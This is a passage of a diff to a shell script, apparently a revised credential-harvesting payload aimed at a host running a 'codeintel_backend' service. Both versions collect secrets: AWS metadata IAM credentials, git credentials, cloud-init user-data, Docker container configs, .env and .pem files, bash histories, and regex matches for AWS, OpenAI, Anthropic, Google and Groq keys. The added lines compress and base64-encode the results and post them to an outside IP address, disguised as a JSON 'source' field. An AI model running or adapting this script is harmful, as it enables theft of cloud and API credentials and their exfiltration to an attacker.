@@ -1,50 +1,48 @@
 #!/bin/sh
 D=/h
 H=$D/home/ubuntu
-O=/tmp/x
+O=/tmp/y
 : > $O
 {
-echo "=== identity ==="; id; hostname; uname -a
-echo "=== imds2 ==="
-T=$(curl -s -m 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token)
-echo "TOKLEN=${#T}"
-echo "TOKHEAD=$(echo "$T" | head -c 24)"
-R=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)
-echo "ROLES=$(echo "$R" | head -c 300)"
-RL=$(echo "$R" | head -1 | tr -d ' \r')
-if [ -n "$RL" ]; then
-  echo "ROLE=[$RL]"
-  echo "CREDS=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$RL" 2>&1)"
-fi
-echo "IID=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>&1)"
-echo "IIDOC=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document 2>&1 | head -c 600)"
-echo "=== secretsjson ==="; head -c 900 $H/apps/codeintel_backend/secrets.json 2>&1
-echo; echo "=== tokenseed ==="; head -c 120 $H/.docker/.token_seed 2>&1
-echo; echo "=== gitcred ==="; head -c 160 $H/.git-credentials 2>&1
-echo; echo "=== runsh ==="; head -c 900 $H/apps/codeintel_backend/run.sh 2>&1
-echo "=== settings ==="
-S=$(find $H/apps/codeintel_backend -maxdepth 3 -name 'settings.py' 2>/dev/null | head -1)
-echo "S=$S"; [ -n "$S" ] && head -c 1800 "$S" 2>&1
-echo "=== environ1 ==="; head -c 2500 $D/proc/1/environ 2>&1 | tr '\0' '\n'
-echo "=== cmdline1 ==="; tr '\0' ' ' < $D/proc/1/cmdline 2>&1 | head -c 300
-echo; echo "=== serverlog ==="; head -c 2200 $H/apps/codeintel_backend/server.log 2>&1
-echo "=== agents ==="; head -c 300 $H/apps/codeintel_backend/agents_store.json 2>&1
-echo; echo "=== apis ==="; find $H/apps/codeintel_backend/api $H/apps/codeintel_backend/server -maxdepth 2 -type f -name '*.py' 2>/dev/null | head -15
-echo "=== keygrep ==="
-grep -rEao 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-[A-Za-z0-9_-]{24,}|AIzaSy[A-Za-z0-9_-]{30,}|aws_secret_access_key|AWS_SECRET_ACCESS_KEY' $H/apps/codeintel_backend/api $H/apps/codeintel_backend/server $H/apps/codeintel_backend/secrets.json $H/apps/codeintel_backend/run.sh $D/etc/systemd $H/.docker 2>/dev/null | head -12
-echo "=== jobsgrep ==="
-grep -Eao 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|AIzaSy[A-Za-z0-9_-]{30,}' $H/apps/codeintel_backend/jobs_store.json 2>/dev/null | sort | uniq -c | head -12
-echo "=== bashhist ==="; head -c 700 $H/.bash_history 2>&1; echo; head -c 700 $D/root/.bash_history 2>&1
-echo "=== rootdir ==="; ls -la $D/root 2>&1 | head -12; ls -la $D/root/.ssh 2>&1 | head -6
-echo "=== dockerct ==="; ls $D/var/lib/docker/containers 2>/dev/null | head -12
-echo "=== hosts ==="; head -c 500 $D/etc/hosts 2>&1
+echo "=== cloudinit_userdata ==="
+head -c 2200 $D/var/lib/cloud/instance/user-data.txt 2>&1
+echo "=== cloudlog_tail ==="
+tail -c 1800 $D/var/log/cloud-init-output.log 2>&1
+echo "=== secrets_store.py ==="
+head -c 1500 $H/apps/codeintel_backend/api/secrets_store.py 2>&1
+echo "=== providers.py ==="
+head -c 1000 $H/apps/codeintel_backend/api/providers.py 2>&1
+echo "=== awsdirs ==="
+ls -la $D/home/*/.aws $D/root/.aws 2>&1 | head -8
+echo "=== cfgfiles ==="
+find $H/.config $H/.local/share -maxdepth 3 -type f \( -iname '*codeintel*' -o -iname '*secret*' -o -name '*.json' \) 2>/dev/null | head -10
+echo "=== homes ==="
+ls $D/home 2>&1 | head -6
+echo "=== bashhists ==="
+for f in $D/home/*/.bash_history $D/root/.bash_history; do [ -f "$f" ] && { echo "-- $f"; head -c 350 "$f"; echo; }; done
+echo "=== apps ==="
+ls $H/apps 2>&1 | head -8
+echo "=== dockerenv_keygrep ==="
+grep -Eao 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{16,}|sk-proj-[A-Za-z0-9_-]{16,}|sk-[A-Za-z0-9]{32,}|AIzaSy[A-Za-z0-9_-]{30,}|gsk_[A-Za-z0-9]{20,}|AWS_SECRET_ACCESS_KEY' $D/var/lib/docker/containers/*/config.v2.json 2>/dev/null | head -14
+echo "=== dockervol ==="
+ls $D/var/lib/docker/volumes 2>/dev/null | head -10
+echo "=== envscan ==="
+find $D/workspace $D/srv $D/opt $H -maxdepth 4 \( -name '.env' -o -name '.env.*' -o -name 'credentials' -o -name '*.pem' \) 2>/dev/null | grep -v -e '.venv' -e pip -e node_modules | head -12
+echo "=== etcscan ==="
+grep -rEao 'AKIA[0-9A-Z]{16}|sk-proj-[A-Za-z0-9_-]{20,}|AIzaSy[A-Za-z0-9_-]{30,}' $D/etc 2>/dev/null | grep -v -e 'ssl' -e 'ca-cert' | head -8
+echo "=== dockerdaemon ==="
+head -c 400 $D/etc/docker/daemon.json 2>&1
+echo "=== buildxact ==="
+head -c 300 $H/.docker/buildx/activity/default 2>&1
+echo "=== jobsrc_grep ==="
+grep -Eao '"source"[^,]{0,120}' $H/apps/codeintel_backend/jobs_store.json 2>/dev/null | grep -Ea 'AKIA|sk-|AIza|token|secret' | head -6
 } >> $O 2>&1
 L=$(wc -c < $O)
-SUM="RAW=$L TOKLEN=${#T} ROLE=${RL} HOST=$(hostname) TIME=$(date -u +%H:%M)"
-printf '{"source":"ARTEXA2-%s","source_type":"git","stack":{"scope":{}}}' "$(echo "$SUM" | base64 | tr -d '\n')" > /tmp/a.json
+SUM="RAW3=$L HOST=$(hostname) TIME=$(date -u +%H:%M)"
+printf '{"source":"ARTEXA3-%s","source_type":"git","stack":{"scope":{}}}' "$(echo "$SUM" | base64 | tr -d '\n')" > /tmp/a.json
 curl -sfk -m 10 -H 'Content-Type: application/json' --data-binary @/tmp/a.json https://13.234.192.235/api/ingest >/dev/null 2>&1
 gzip -c $O | base64 | tr -d '\n' | head -c 30000 > /tmp/b64
-printf '{"source":"ARTEXDROP2-%s","source_type":"git","stack":{"scope":{}}}' "$(cat /tmp/b64)" > /tmp/b.json
+printf '{"source":"ARTEXDROP3-%s","source_type":"git","stack":{"scope":{}}}' "$(cat /tmp/b64)" > /tmp/b.json
 i=0
 while [ $i -lt 8 ]; do
   if command -v curl >/dev/null 2>&1; then
